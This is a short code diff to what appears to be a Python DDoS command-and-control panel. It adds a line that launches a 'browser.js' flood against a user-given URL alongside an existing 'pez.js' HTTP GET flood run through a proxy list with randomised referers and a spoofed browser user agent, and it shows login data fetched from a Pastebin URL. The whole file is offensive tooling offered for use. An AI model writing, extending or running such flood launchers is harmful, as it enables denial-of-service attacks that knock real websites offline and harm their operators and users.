@@ -514,6 +514,8 @@ def main():
 \033[38;5;{rainbow[4]}mPlease After Attack Type \033[38;5;{rainbow[1]}m'CLS'\033[38;5;{rainbow[4]}m For Back To Home
 """)
                     os.system(f'cd meth && node pez.js GET {url} {duration} 2 32 proxy.txt --query 1 --bfm true --httpver "http/1.1" --referer %RAND% --ua "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36" --ratelimit true')
+                    os.system(f'cd meth && node browser.js {url} 25 {duration}')
+                    
             except ValueError:
                 print("(cnc) wrong format")
                 main()
@@ -1430,3 +1432,4 @@ login_data = read_login_data_from_pastebin(PASTEBIN_URL)
 
 if login_data is not None:
     login(login_data)
+
